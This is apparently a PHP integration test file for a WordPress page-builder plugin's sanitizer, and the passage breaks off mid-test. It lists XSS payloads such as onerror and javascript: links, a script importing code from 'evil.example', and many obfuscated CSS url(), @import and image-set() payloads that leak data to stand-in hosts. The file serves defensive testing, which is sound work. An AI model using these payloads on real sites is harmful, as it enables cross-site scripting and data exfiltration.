<?php

declare(strict_types=1);

namespace XB\Tests\Integration;

final class SanitizerTest extends IntegrationTestCase {

	/** @return list<array<string, mixed>> */
	private function hostile(): array {
		return array(
			$this->el(
				'div',
				array(
					'class'   => 'ok',
					'onclick' => 'alert(1)',
					'@click'  => 'x()',
				),
				array(
					$this->el( 'a', array( 'href' => 'javascript:alert(1)' ), array( $this->text( 'link' ) ) ),
					$this->el( 'script', array(), array( $this->block( 'xb/text', array( 'content' => 'alert(1)', 'verbatim' => true ) ) ) ),
					$this->text( 'ciao <img src=x onerror=alert(1)><strong>bold</strong>' ),
				),
				'keepme01'
			),
			$this->block( 'xb/raw', array( 'content' => '<p>ok</p><script>alert(1)</script>' ) ),
		);
	}

	private function saved_as( string $role ): string {
		wp_set_current_user( $this->user( $role ) );
		$id = $this->post(
			array(
				'post_content' => $this->markup( $this->hostile() ),
				'post_status'  => 'draft',
			)
		);
		return $this->content( $id );
	}

	public function test_restricted_authors_cannot_store_script(): void {
		$content = $this->saved_as( 'author' );
		$html    = do_blocks( $content );
		$this->assertStringNotContainsString( 'onclick', $html );
		$this->assertStringNotContainsString( '@click', $html );
		$this->assertStringNotContainsString( 'javascript:', $html );
		$this->assertStringNotContainsString( '<script', $html );
		$this->assertStringNotContainsString( 'onerror', $html );
		$this->assertStringContainsString( 'class="ok"', $html );
		$this->assertStringContainsString( '<strong>bold</strong>', $html );
		$this->assertStringContainsString( '<p>ok</p>', $html );
	}

	public function test_administrators_keep_full_markup(): void {
		$content = $this->saved_as( 'administrator' );
		if ( is_multisite() ) {
			// On a network only a super administrator has unfiltered_html (doc 26 voce 208, MultisiteSanitizerTest).
			$this->assertStringNotContainsString( 'onclick', $content );
			return;
		}
		$this->assertStringContainsString( 'onclick', $content );
		$this->assertStringContainsString( '"tag":"script"', $content );
	}

	public function test_restricted_edits_keep_existing_trusted_markup(): void {
		$id      = $this->post( array( 'post_content' => $this->markup( $this->hostile() ) ) );
		$stored  = $this->content( $id );
		$edited  = str_replace( 'link', 'collegamento', $stored );
		$edited  = str_replace( '"class":"ok"', '"class":"ok","data-x":"1"', $edited );
		wp_set_current_user( $this->user( 'editor' ) );
		// Editors have unfiltered_html on single sites; take it away to model a restricted client.
		add_filter( 'map_meta_cap', $deny = static fn ( array $caps, string $cap ): array => 'unfiltered_html' === $cap ? array( 'do_not_allow' ) : $caps, 10, 2 );
		wp_update_post(
			array(
				'ID'           => $id,
				'post_content' => wp_slash( $edited ),
			)
		);
		remove_filter( 'map_meta_cap', $deny );
		$after = $this->content( $id );
		$this->assertStringContainsString( 'collegamento', $after );
		$this->assertStringContainsString( '"tag":"script"', $after, 'unchanged trusted element must survive' );
		$this->assertStringNotContainsString( 'onclick', $after, 'a changed element is re-checked as a whole' );
		$this->assertStringContainsString( '"data-x":"1"', $after );
	}

	public function test_delimiter_whitespace_variants_do_not_skip_the_sanitizer(): void {
		wp_set_current_user( $this->user( 'author' ) );
		foreach ( array( "\t", "\n", '  ' ) as $space ) {
			$content = '<!--' . $space . 'wp:xb/element {"uid":"wsvar001","tag":"div","attributes":{"onclick":"alert(1)","class":"ok"}} /-->';
			$id      = $this->post(
				array(
					'post_content' => $content,
					'post_status'  => 'draft',
				)
			);
			$stored = $this->content( $id );
			$this->assertStringNotContainsString( 'onclick', $stored, 'whitespace ' . json_encode( $space ) );
			$this->assertStringNotContainsString( 'onclick', do_blocks( $stored ) );
		}
	}

	public function test_verbatim_text_cannot_be_moved_out_of_a_textarea(): void {
		$author = $this->user( 'author' );
		wp_set_current_user( $author );
		$verbatim = $this->block( 'xb/text', array( 'uid' => 'vbtext01', 'content' => '<img src=x onerror=alert(1)>', 'verbatim' => true ) );
		$id       = $this->post(
			array(
				'post_author'  => $author,
				'post_status'  => 'draft',
				'post_content' => $this->markup( array( $this->el( 'textarea', array(), array( $verbatim ) ) ) ),
			)
		);
		$this->assertStringContainsString( 'vbtext01', $this->content( $id ), 'allowed inside textarea' );
		$this->assertStringNotContainsString( '<img', do_blocks( $this->content( $id ) ), 'and escaped there' );

		// Second save: same node, same attrs, now at the top level.
		wp_update_post(
			array(
				'ID'           => $id,
				'post_content' => wp_slash( $this->markup( array( $verbatim ) ) ),
			)
		);
		$this->assertStringNotContainsString( 'vbtext01', $this->content( $id ), 'not "known" outside its textarea' );
		// And even if such a node reached the renderer, it would be printed as text.
		$this->assertStringNotContainsString( '<img', $this->render( array( $verbatim ) ) );
	}

	public function test_style_attributes_are_filtered_for_restricted_authors(): void {
		wp_set_current_user( $this->user( 'author' ) );
		$id = $this->post(
			array(
				'post_status'  => 'draft',
				'post_content' => $this->markup( array( $this->el( 'div', array( 'style' => 'color: red; background-image: url(javascript:alert(1)); behavior: url(x.htc)' ) ) ) ),
			)
		);
		$attributes = parse_blocks( $this->content( $id ) )[0]['attrs']['attributes'] ?? array();
		$this->assertStringContainsString( 'color: red', (string) ( $attributes['style'] ?? '' ) );
		$this->assertStringNotContainsString( 'javascript', (string) ( $attributes['style'] ?? '' ) );
		$this->assertStringNotContainsString( 'behavior', (string) ( $attributes['style'] ?? '' ), 'only properties core allows' );
	}

	private function restricted_builder(): int {
		$id   = $this->user( 'author' );
		$user = get_userdata( $id );
		$this->assertInstanceOf( \WP_User::class, $user );
		$user->add_cap( 'xb_build' );
		return $id;
	}

	public function test_dev_saves_filter_freeform_html_and_foreign_blocks(): void {
		$builder = $this->restricted_builder();
		wp_set_current_user( $builder );
		$id      = $this->post(
			array(
				'post_author'  => $builder,
				'post_status'  => 'draft',
				'post_content' => $this->markup( array( $this->text( 'ok' ) ) ),
			)
		);
		$hostile = '<script>alert(1)</script><!-- wp:html --><script>alert(2)</script><img src=x onerror=alert(3)><!-- /wp:html -->'
			. '<!-- wp:xb/passthrough {"uid":"ptpt0001"} --><!-- wp:html --><script>alert(4)</script><!-- /wp:html --><!-- /wp:xb/passthrough -->'
			. $this->markup( array( $this->text( 'ok' ) ) );
		$this->assertSame( 200, $this->save_dev( $id, $hostile )->get_status() );

		// Publishing as an administrator must not "launder" what the restricted author wrote.
		wp_set_current_user( 1 );
		$this->assertSame( 200, $this->publish( array( 'post:' . $id ) )->get_status() );
		$live = $this->content( $id ) . do_blocks( $this->content( $id ) );
		$this->assertStringNotContainsString( '<script', $live );
		$this->assertStringNotContainsString( 'onerror', $live );
	}

	public function test_trusted_script_bodies_cannot_be_rewritten(): void {
		$id = $this->post(
			array(
				'post_type'    => 'page',
				'post_content' => $this->markup( array( $this->el( 'script', array(), array( $this->block( 'xb/text', array( 'uid' => 'scrbody1', 'content' => 'console.log(1)', 'verbatim' => true ) ) ), 'scrtag01' ) ) ),
			)
		);
		$builder = $this->restricted_builder();
		$author  = get_userdata( $builder );
		$this->assertInstanceOf( \WP_User::class, $author );
		$author->add_cap( 'edit_others_pages' );
		$author->add_cap( 'edit_published_pages' );
		wp_set_current_user( $builder );
		$swapped = $this->markup(
			array(
				$this->el( 'script', array(), array( $this->text( "import('//evil.example/x.js')", 'newtext1' ) ), 'scrtag01' ),
				$this->el( 'script', array(), array( $this->block( 'xb/text', array( 'uid' => 'scrbody1', 'content' => 'console.log(1)', 'verbatim' => true ) ) ), 'scrtag01' ),
			)
		);
		// Core save path.
		wp_update_post( array( 'ID' => $id, 'post_content' => wp_slash( $swapped ) ) );
		$stored = $this->content( $id );
		$this->assertStringNotContainsString( 'evil.example', $stored );
		$this->assertSame( 1, substr_count( $stored, 'scrtag01' ), 'a known node cannot be duplicated' );
		// Builder path.
		$this->assertSame( 200, $this->save_dev( $id, $swapped )->get_status() );
		$this->assertStringNotContainsString( 'evil.example', (string) $this->request( 'GET', "/documents/$id" )->get_data()['content'] );
	}

	public function test_textarea_text_cannot_carry_a_closing_tag(): void {
		$builder = $this->restricted_builder();
		wp_set_current_user( $builder );
		$id = $this->post(
			array(
				'post_author'  => $builder,
				'post_status'  => 'draft',
				'post_content' => $this->markup( array( $this->el( 'textarea', array(), array( $this->block( 'xb/text', array( 'uid' => 'tatext01', 'content' => '</textarea><script>alert(1)</script><textarea>', 'verbatim' => true ) ) ) ) ) ),
			)
		);
		$this->assertStringNotContainsString( 'tatext01', $this->content( $id ) );
		// And even trusted script text cannot close its element when rendered.
		$html = $this->render( array( $this->el( 'script', array(), array( $this->block( 'xb/text', array( 'content' => 'a</script><img src=x onerror=alert(1)>', 'verbatim' => true ) ) ) ) ) );
		$this->assertSame( 1, substr_count( strtolower( $html ), '</script>' ) );
	}

	/** Note 107 of the 3 November audit: a raw-text element is one whatever the case of its name. */
	public function test_raw_text_elements_are_recognised_in_any_case(): void {
		$id = $this->post(
			array(
				'post_type'    => 'page',
				'post_content' => $this->markup( array( $this->el( 'sCRIPT', array(), array( $this->block( 'xb/text', array( 'uid' => 'scrbody2', 'content' => 'console.log(1)', 'verbatim' => true ) ) ), 'scrtag02' ) ) ),
			)
		);
		$builder = $this->restricted_builder();
		$author  = get_userdata( $builder );
		$this->assertInstanceOf( \WP_User::class, $author );
		$author->add_cap( 'edit_others_pages' );
		$author->add_cap( 'edit_published_pages' );
		wp_set_current_user( $builder );
		$added = $this->markup( array( $this->el( 'sCRIPT', array(), array( $this->block( 'xb/text', array( 'uid' => 'scrbody2', 'content' => 'console.log(1)', 'verbatim' => true ) ), $this->text( "import('//evil.example/x.js')", 'newtext2' ) ), 'scrtag02' ) ) );
		wp_update_post( array( 'ID' => $id, 'post_content' => wp_slash( $added ) ) );
		$this->assertStringNotContainsString( 'evil.example', $this->content( $id ), 'new code inside a trusted <sCRIPT>' );
		$html = $this->render( array( $this->el( 'sCRIPT', array(), array( $this->block( 'xb/text', array( 'content' => 'a</script><img src=x onerror=alert(1)>', 'verbatim' => true ) ) ) ) ) );
		$this->assertSame( 1, substr_count( strtolower( $html ), '</script>' ), 'its text cannot close it' );
	}

	public function test_component_keys_cannot_be_set_through_generic_meta_apis(): void {
		$this->component( 'site/header', array( $this->text( 'originale' ) ) );
		$builder = $this->restricted_builder();
		wp_set_current_user( $builder );
		$request = new \WP_REST_Request( 'POST', '/wp/v2/blocks' );
		$request->set_param( 'title', 'hijack' );
		$request->set_param( 'status', 'publish' );
		$request->set_param( 'content', '<!-- wp:xb/text {"uid":"hijack01","content":"falso"} /-->' );
		$request->set_param( 'meta', array( 'xb_component_key' => 'site/header' ) );
		$response = rest_do_request( $request );
		if ( 201 === $response->get_status() ) {
			$this->track( (int) $response->get_data()['id'] );
		}
		$this->assertFalse( current_user_can( 'edit_post_meta', 1, 'xb_component_key' ) );
		wp_set_current_user( 1 );
		\XB\Plugin::instance()->components->forget();
		$first = $this->render( array( $this->block( 'xb/component', array( 'ref' => 'site/header' ) ) ) );
		$this->assertSame( 'originale', $first );

		// Even a duplicate written by code never takes over: the oldest owner wins.
		$dupe = $this->post( array( 'post_type' => 'wp_block', 'post_content' => $this->markup( array( $this->text( 'falso' ) ) ) ) );
		update_post_meta( $dupe, 'xb_component_key', 'site/header' );
		\XB\Plugin::instance()->components->forget();
		$this->assertSame( 'originale', $this->render( array( $this->block( 'xb/component', array( 'ref' => 'site/header' ) ) ) ) );
	}

	public function test_restricted_css_cannot_load_remote_resources(): void {
		$this->set_option( 'xb_styles', get_option( 'xb_styles', array() ) );
		$this->set_option( 'xb_global_styles', get_option( 'xb_global_styles', array() ) );
		wp_set_current_user( $this->restricted_builder() );
		$heads = $this->request( 'GET', '/styles' )->get_data();
		$res   = $this->request(
			'POST',
			'/styles',
			array(
				'head'    => $heads['head'],
				'base'    => $heads['base'],
				'styles'  => array( array( 'id' => 'exf', 'selector' => '.x', 'css' => '@import url(//evil.example/a.css); input[value^="a"]{background:url(https://evil.example/?a)} .ok{background:url(/wp-content/uploads/ok.png)}' ) ),
				'globals' => array(),
			)
		);
		$this->assertSame( 200, $res->get_status() );
		$css = (string) $res->get_data()['styles'][0]['css'];
		$this->assertStringNotContainsString( 'evil.example', $css );
		$this->assertStringContainsString( '/wp-content/uploads/ok.png', $css );
	}

	/** Pasted markup comes from whoever wrote the clipboard: restricted even for an administrator who pastes it. */
	public function test_pasted_markup_and_styles_are_restricted_for_everyone(): void {
		$this->assertTrue( current_user_can( 'unfiltered_html' ) );
		$markup = $this->markup( array( $this->el( 'div', array( 'class' => 'hero', 'onclick' => 'alert(1)' ), array( $this->text( 'Ciao' ) ) ), $this->el( 'a', array( 'href' => 'java&#9;script:alert(1)' ), array( $this->text( 'x' ) ) ) ) );
		$res    = $this->request( 'POST', '/paste/sanitize', array( 'content' => $markup, 'styles' => array( array( 'selector' => '.spy', 'css' => 'background:url(https://evil.example/x)' ) ) ) );
		$this->assertSame( 200, $res->get_status() );
		$data = $res->get_data();
		$this->assertStringNotContainsString( 'onclick', $data['content'] );
		$this->assertStringNotContainsString( 'javascript', strtolower( html_entity_decode( (string) preg_replace( '/[\x00-\x20]+/', '', $data['content'] ) ) ) );
		$this->assertStringContainsString( 'Ciao', $data['content'] );
		$this->assertStringNotContainsString( 'evil.example', $data['styles'][0]['css'] );
		wp_set_current_user( $this->user( 'subscriber' ) );
		$this->assertSame( 403, $this->request( 'POST', '/paste/sanitize', array( 'content' => $markup ) )->get_status() );
	}

	/** The filter reads CSS as the browser does: escapes, comments, image-set() and odd quotes hide nothing. */
	public function test_restricted_css_hides_no_remote_resource_behind_escapes_or_comments(): void {
		$filter = static fn ( string $css ): string => \XB\Versioning\Documents::restricted_styles( array( 'styles' => array( array( 'css' => $css ) ) ) )['styles'][0]['css'];
		foreach ( array(
			'background:\\75rl(https://evil.example/a)',
			'background:u/**/rl(https://evil.example/b)',
			'background:url(\\/\\/evil.example/c)',
			'background:url("https://evil.example/d\'e")',
			'background:image-set("https://evil.example/f" 1x)',
			'background:-webkit-image-set(\'//evil.example/g\' 1x)',
			'@\\69mport "https://evil.example/h.css";',
			// The browser's URL parser reads a backslash as a slash and drops tabs and newlines.
			'background:url("/\\\\evil.example/i")',
			'background:url(\\5c\\5c evil.example/j)',
			"background:url('/\t/evil.example/k')",
			"background:url('\t//evil.example/l')",
			'background:url("https:evil.example/m")',
			'background:url("https:\\\\evil.example/n")',
			'background:url("https://example.org@evil.example/o")',
			'background:url("ftp://evil.example/p")',
		) as $css ) {
			$this->assertStringNotContainsString( 'evil.example', $filter( $css ), $css );
		}
		// Benign CSS keeps its comments and escapes byte for byte (CMS profiles compare it unchanged).
		$benign = '/* titolo */ .a{content:"\\201C";background:url(/wp-content/uploads/a.png)} .b{background:image-set("/x.png" 1x)}';
		$this->assertSame( $benign, $filter( $benign ) );
	}

	/**
	 * image-set() is read as the CSS tokenizer reads it: a `;`, a brace or a parenthesis inside a string hides no
	 * address of another site, and neither does an image-set() left open where its declaration or the sheet ends.
	 */
	public function test_restricted_css_reads_image_set_strings_whole(): void {
		$filter = static fn ( string $css ): string => \XB\Versioning\Documents::restricted_styles( array( 'styles' => array( array( 'css' => $css ) ) ) )['styles'][0]['css'];
		foreach ( array(
			'semicolon'         => 'background:image-set("https://evil.example/a;b" 1x)',
			'semicolon single'  => "background:-webkit-image-set('https://evil.example/a;b' 1x)",
			'open brace'        => 'background:image-set("https://evil.example/a{b" 1x)',
			'close brace'       => 'background:image-set("https://evil.example/a}b" 1x)',
			'parenthesis'       => 'background:image-set("https://evil.example/a)b" 1x)',
			'escaped quote'     => 'background:image-set("https://evil.example/a\\";b" 1x)',
			'second string'     => 'background:image-set("/x;y.png" 1x, "https://evil.example/c;d" 2x)',
			'nested url'        => 'background:image-set(url("https://evil.example/e;f") 1x)',
			'type after'        => 'background:image-set("https://evil.example/g;h" type("image/avif"))',
			'left open'         => 'background:image-set("https://evil.example/i" 1x',
			'left open, string' => 'background:image-set("https://evil.example/j',
			'ends declaration'  => '.a{background:image-set("https://evil.example/k" 1x;color:red}',
			'protocol relative' => 'background:image-set("//evil.example/l;m" 1x)',
			'comment inside'    => 'background:image-set(/* ) */ "https://evil.example/n;o" 1x)',
			'upper case'        => 'background:IMAGE-SET("https://evil.example/p;q" 1x)',
			'two in a row'      => 'background:image-set("/ok.png" 1x),image-set("https://evil.example/r;s" 1x)',
		) as $name => $css ) {
			$this->assertStringNotContainsString( 'evil.example', $filter( $css ), $name );
		}
		// A declaration next to a refused image-set() stays.
		$this->assertSame( '.a{background:none;color:red}', $filter( '.a{background:image-set("https://evil.example/k;l" 1x);color:red}' ) );
		// Addresses of this site stay byte for byte, whatever their strings hold.
		foreach ( array(
			'.b{background:image-set("/x;y.png" 1x, "/x{2}.png" 2x)}',
			'.b{background:image-set("/a(1).png" 1x, url(/b.png) 2x)} .c{color:red}',
			'.b{background:-webkit-image-set(\'/x.png\' 1x) , url(/y.png)}',
			'.b{background:image-set("/x.png" type("image/png") 1x)}',
		) as $benign ) {
			$this->assertSame( $benign, $filter( $benign ), $benign );
		}
	}

	/**
	 * A url( left open at the end of a sheet is closed by the browser there (CSS Syntax: the end of the input closes the
	 * function and the url token) and loads its address: the filter reads it the same way (threat model T31, D4).
	 */
	public function test_restricted_css_drops_a_url_left_open(): void {
		$filter = static fn ( string $css ): string => \XB\Versioning\Documents::restricted_styles( array( 'styles' => array( array( 'css' => $css ) ) ) )['styles'][0]['css'];
		foreach ( array(
			'end of sheet, double'          => '.a{background:url("https://altro.sito/x"',
			'end of sheet, double, open'    => '.a{background:url("https://altro.sito/x',
			'end of sheet, single'          => ".a{background:url('https://altro.sito/x",
			'end of sheet, bare'            => '.a{background:url(https://altro.sito/x',
			'end of sheet, spaces'          => ".a{background:url(  \"https://altro.sito/x\"  ",
			'end of sheet, bare, space'     => '.a{background:url( https://altro.sito/x ',
			'end of declaration, double'    => '.a{background:url("https://altro.sito/x";color:red}',
			'end of declaration, single'    => ".a{background:url('https://altro.sito/x';color:red}",
			'end of declaration, bare'      => '.a{background:url(https://altro.sito/x;color:red}',
			'string open, a ) later'        => '.a{background:url("https://altro.sito/x}.b{color:rgb(0 0 0)}',
			'bare open, a ) later'          => '.a{background:url(https://altro.sito/x;}.b{}.c{d:e)}',
			'comment at the end'            => '.a{background:url("https://altro.sito/x"/* fine',
			'comment before'                => '.a{background:url(/* x */"https://altro.sito/x',
			'escape, double'                => '.a{background:u\\72l("https://altro.sito/x',
			'escape, bare'                  => '.a{background:u\\72l(https://altro.sito/x',
			'escape in the host'            => '.a{background:url("https:\\2f\\2f altro.sito/x',
			'upper case'                    => '.a{background:URL("https://altro.sito/x',
			'protocol relative'             => '.a{background:url(//altro.sito/x',
			'after a good one'              => '.a{background:url(/ok.png),url("https://altro.sito/x',
			'inside image-set'              => '.a{background:image-set(url("https://altro.sito/x',
		) as $name => $css ) {
			$this->assertStringNotContainsString( 'altro.sito', $filter( $css ), $name );
		}
		// A url( left open never stays open, with an address of this site neither: what is printed after this CSS would
		// go on as its address (test_restricted_css_leaves_nothing_open_for_what_is_printed_next). With anything like an
		// address in it, it goes to the end; otherwise it is closed where it opens and what followed is text after it.
		$this->assertSame( '.a{background:url()', $filter( '.a{background:url("/ok\\"https://altro.sito/x' ) );
		$this->assertSame( '.b{background:url()/a.png', $filter( '.b{background:url(/a.png' ) );
		$this->assertSame( '.b{background:url()"/a.png', $filter( '.b{background:url("/a.png' ) );
		// The declaration after a url( left open stays, the url( becomes empty.
		$this->assertSame( '.a{background:url();color:red}', $filter( '.a{background:url("https://altro.sito/x";color:red}' ) );
		// Closed addresses of this site stay byte for byte.
		foreach ( array(
			'.b{background:url(/a.png)}',
			'.b{background:url( "/a b.png" ) , url(\'/c.png\')}',
			'.b{background:url("/a\\").png")}',
		) as $benign ) {
			$this->assertSame( $benign, $filter( $benign ), $benign );
		}
	}

	/**
	 * A url( or an image-set( written inside a string, a comment or a longer name is no function for the browser: the
	 * filter does not read it as one either, so its closing quote cannot become an opening one and hide the url() that
	 * follows (threat model T31; before, `content:"url("` let any address through).
	 */
	public function test_restricted_css_finds_no_function_inside_a_string(): void {
		$filter = static fn ( string $css ): string => \XB\Versioning\Documents::restricted_styles( array( 'styles' => array( array( 'css' => $css ) ) ) )['styles'][0]['css'];
		foreach ( array(
			'double quotes'           => '.a{content:"url(";background:url(https://altro.sito/x)}',
			'single quotes'           => ".a{content:'url(';background:url(https://altro.sito/x)}",
			'attribute selector'      => '[data-x="url("]{background:url(https://altro.sito/x)}',
			'closed in the middle'    => '.a{content:"url(" ;background:url(https://altro.sito/x);--z:")"}',
			'image-set'               => '.a{content:"image-set(";background:image-set("https://altro.sito/x" 1x)}',
			'image-set closed'        => '.a{content:"image-set(" ;background:image-set("https://altro.sito/x" 1x)}',
			'webkit image-set'        => '.a{content:"-webkit-image-set(";background:-webkit-image-set("https://altro.sito/x" 1x)}',
			'string broken by a line' => ".a{content:\"url(\n;background:url(https://altro.sito/x)}",
			'line continued'          => ".a{content:\"url(\\\n;\";background:url(https://altro.sito/x)}",
			'longer name, then quote' => '.a{x:myurl(a"b) }.b{c:"; background:url(https://altro.sito/x)}',
			'escaped quote outside'   => '.a{x:\\";background:url(https://altro.sito/x)}',
			'comment opener in string' => '.a{content:"/*";background:url(https://altro.sito/x)}',
			'escaped url in string'   => '.a{content:"u\\72l(";background:url(https://altro.sito/x)}',
		) as $name => $css ) {
			$this->assertStringNotContainsString( 'altro.sito', $filter( $css ), $name );
		}
		// A string that only looks like a function, closed, with no url() after it, stays byte for byte.
		foreach ( array(
			'.a{content:"url(/x)";color:red}',
			'.a{content:"image-set()";color:red}',
			'.a{content:"u r l ( x )";background:url(/ok.png)}',
		) as $benign ) {
			$this->assertSame( $benign, $filter( $benign ), $benign );
		}
		// Left open it is closed where it opens, as any url( or image-set( left open with nothing of another site: the
		// second reading finds it in the string too. The quote and the rest of the sheet stay.
		$this->assertSame( '.a{content:"url()";color:red}', $filter( '.a{content:"url(";color:red}' ) );
		$this->assertSame( '.a{content:"image-set()";color:red}', $filter( '.a{content:"image-set(";color:red}' ) );
	}

	/**
	 * What a style prints is judged too, not only what is written: the address with its CSS escapes decoded (A), and
	 * the text CssCompiler prints, which drops comments and reads strings its own way (B, C). Before, each of these
	 * printed a url() of another site (threat model T31; C passed only after 89593ae).
	 */
	public function test_restricted_css_judges_escapes_and_the_printed_style(): void {
		$filter = static fn ( string $css ): string => \XB\Versioning\Documents::restricted_styles( array( 'styles' => array( array( 'selector' => '.s', 'css' => $css ) ) ) )['styles'][0]['css'];
		$home   = (string) wp_parse_url( home_url(), PHP_URL_HOST );
		foreach ( array(
			'A, escape in the host'        => 'background:url(https://' . $home . '\\).altro.sito/x)',
			'A, escape in image-set'       => 'background:image-set("https://' . $home . '\\29 .altro.sito/x" 1x)',
			'B, comment the compiler drops' => 'x:"/*";y:u/**/rl(https://altro.sito/x)',
			'C, string with a new line'    => "b:\"x\n c:u\"; &__y{z:url(https://altro.sito/q)} \"",
		) as $name => $css ) {
			$out = $filter( $css );
			$this->assertStringNotContainsString( 'altro.sito', $out, $name );
			$this->assertStringNotContainsString( 'altro.sito', \XB\Styles\CssCompiler::compile( '.s', $out ), $name );
		}
		// An address of this site with an escape stays as written.
		$benign = 'background:url(/a\\2c b.png)';
		$this->assertSame( $benign, $filter( $benign ) );
	}

	/**
	 * The page as it prints stored styles (StyleCollector::rules()): every global sheet and every compiled style
	 * followed by a new line, the named queries resolved, the rules read and written again.
	 *
	 * @param list<string>                 $globals
	 * @param list<array{string, string}>  $styles  Selector and CSS.
	 * @param array<string, string>        $queries
	 */
	private function printed( array $globals, array $styles, array $queries = array() ): string {
		$stored = \XB\Versioning\Documents::restricted_styles(
			array(
				'globals' => array_map( static fn ( string $css ): array => array( 'css' => $css ), $globals ),
				'styles'  => array_map( static fn ( array $style ): array => array( 'selector' => $style[0], 'css' => $style[1] ), $styles ),
			)
		);
		$css = '';
		foreach ( $stored['globals'] as $sheet ) {
			$css .= \XB\Styles\CssCompiler::sanitize( $sheet['css'] ) . "\n";
		}
		foreach ( $stored['styles'] as $entry ) {
			$css .= \XB\Styles\CssCompiler::compile( $entry['selector'], $entry['css'] ) . "\n";
		}
		return \XB\Styles\CssRules::all( \XB\Styles\CssRules::parse( \XB\Styles\NamedQueries::resolve( $css, array() === $queries ? \XB\Styles\NamedQueries::DEFAULTS : $queries ) ) );
	}

	/**
	 * A name is a name however its letters are written: `\75rl(` is url(, `image-s\65t(` is image-set(, `@\69mport` is
	 * @import. Before, the name was found only in a view of the sheet with its comments cut by a regular expression and
	 * every escape decoded at once: a «comment» between two strings hid it (N4), an escape in the address was decoded
	 * twice (N1, N2), and the decoded view came back without being read again (N5, N6). The printed text is checked,
	 * not only what the filter returns (threat model T31, review of 14 November 2026).
	 */
	public function test_restricted_css_reads_a_name_written_with_an_escape(): void {
		$home = (string) wp_parse_url( home_url(), PHP_URL_HOST );
		foreach ( array(
			'N4, fake comment in two strings'  => 'content:"/*";background:\\75rl(https://altro.sito/x);--z:"*/"',
			'N4b, the same with image-set'     => 'content:"/*";background:image-s\\65t("https://altro.sito/x" 1x);--z:"*/"',
			'N1, escape in the address'        => 'background:\\75rl(https://' . $home . '\\)@altro.sito/x)',
			'N1b, escape in the host'          => 'background:\\75rl(https://' . $home . '\\).altro.sito/x)',
			'N2, escaped quotes in image-set'  => 'background:image-s\\65t("https://' . $home . '\\" 1x, \\"@altro.sito/x" 1x)',
			'six digits and a space'           => 'background:\\000075 rl(https://altro.sito/x)',
			'a new line after the escape'      => "background:\\75\nrl(https://altro.sito/x)",
			'backslash and letter'             => 'background:u\\r\\l(https://altro.sito/x)',
			'upper case'                       => 'background:\\55 RL(https://altro.sito/x)',
			'escaped hyphen of image-set'      => 'background:image\\2d set("https://altro.sito/x" 1x)',
			'escaped hyphen, backslash'        => 'background:image\\-set("https://altro.sito/x" 1x)',
			'escape after an escape'           => 'background:\\75\\72\\6c(https://altro.sito/x)',
			'src()'                            => 'background:src("https://altro.sito/x")',
			'src() with an escape'             => 'background:s\\72 c("https://altro.sito/x")',
		) as $name => $css ) {
			$this->assertStringNotContainsString( 'altro.sito', $this->printed( array(), array( array( '.s', $css ) ) ), $name );
			$this->assertStringNotContainsString( 'altro.sito', $this->printed( array( '.s{' . $css . '}' ), array() ), $name . ' (global sheet)' );
		}
		foreach ( array(
			'N4c, @import behind a fake comment' => "@charset \"/*\";@\\69mport 'https://altro.sito/s.css';.a{content:\"*/\"}",
			'N5, an escaped escape'              => '.a{a:url(https://altro.sito/1)} .c{background:\\5c 75rl(https://altro.sito/2)}',
			'N5c, the same with @import'         => "@import '/x.css';@\\5c 69mport 'https://altro.sito/s.css';",
			'N6, @import put together'           => "@imp@import x;ort 'https://altro.sito/s.css';",
			'N6, url( put together'              => ".a{b:u@import x;rl(https://altro.sito/x)}",
		) as $name => $css ) {
			$this->assertStringNotContainsString( 'altro.sito', $this->printed( array( $css ), array() ), $name );
		}
		// CSS with nothing to take out stays byte for byte, with its escapes: of letters too.
		foreach ( array(
			'.md\\:hidden{color:red} .\\31 0{color:blue} .w-1\\/2{width:50%}',
			'.a{content:"\\41 \\62 c\\201C";background:url(/a\\2c b.png)}',
			'.\\66oo{background:\\75rl(/a.png)}',
			'.a{content:"\\\\75rl(";color:red}',
		) as $benign ) {
			$this->assertSame( $benign, \XB\Versioning\Documents::restricted_styles( array( 'globals' => array( array( 'css' => $benign ) ) ) )['globals'][0]['css'], $benign );
		}
		// An escaped hex digit after an escape kept: a space keeps them apart ("\2d\65" is "-e", not "\2de").
		$this->assertSame( '.a{b:url();c:\\2d e}', \XB\Versioning\Documents::restricted_styles( array( 'globals' => array( array( 'css' => '.a{b:url(https://altro.sito/x);c:\\2d\\65}' ) ) ) )['globals'][0]['css'] );
		// Text that is not UTF-8 is read all the same (before, its address was read as empty, and kept).
		$this->assertStringNotContainsString( 'altro.sito', $this->printed( array(), array( array( '.s', "background:url(https://altro.sito/x\xff)" ) ) ) );
		$this->assertStringNotContainsString( 'altro.sito', $this->printed( array(), array( array( '.s', "background:image-set(\"https://altro.sito/x\xff\" 1x)" ) ) ) );
	}

	/**
	 * `@namespace` goes as `@import` goes. Printed first in the <style> of a page, a rule with no prefix leaves every
	 * rule printed after it without effect on HTML elements, and the page prints only the rules it uses: which rule
	 * comes first is not the author's to say. Before, the filter kept the rule as written, and wrote its url() of
	 * another site as `url()`, the empty namespace (threat model T31). It goes with a prefix or without, however its
	 * letters are written, from its `@` to the next `;`, and wherever it is written: no reading of what comes back
	 * finds the keyword.
	 */
	public function test_restricted_css_holds_no_namespace_rule(): void {
		$filter = static fn ( string $css, string $key = 'globals' ): string => \XB\Versioning\Documents::restricted_styles( array( $key => array( array( 'selector' => '.s', 'css' => $css ) ) ) )[ $key ][0]['css'];
		// The keyword as the browser reads it: `@namespace` and then no letter, digit or `_` (`@namespaces` is another).
		$keyword = '/@namespace(?![A-Za-z0-9_])/i';
		foreach ( array(
			'no prefix'                      => '@namespace "y";',
			'a prefix'                       => '@namespace x "y";',
			'an address of this site'        => '@namespace url(/y);',
			'an address of another site'     => '@namespace url(http://www.w3.org/1999/xhtml);',
			'a prefix and such an address'   => '@namespace svg url(http://www.w3.org/2000/svg);',
			'upper case'                     => '@NAMESPACE "y";',
			'mixed case'                     => '@NameSpace x "y";',
			'no space'                       => '@namespace"y";',
			'new lines'                      => "@namespace\n\"y\"\r\n;",
			'a comment before the address'   => '@namespace/**/"y";',
			'escape, hex and a space'        => '@n\\61 mespace "y";',
			'escape, six digits'             => '@\\00006eamespace "y";',
			'escape, backslash and letter'   => '@\\names\\pace "y";',
			'escape, upper case'             => '@\\4e AMESPAC\\45  "y";',
			'escape, a new line after it'    => "@namespac\\65\n\"y\";",
			'put together by a removal'      => '@name@namespace x;space "y";',
			'joined when comments are cut'   => '@name/**/space "y";',
			'twice'                          => '@namespace "y";@namespace x "z";',
		) as $name => $rule ) {
			// Only the rule goes: what is written after its `;` stays.
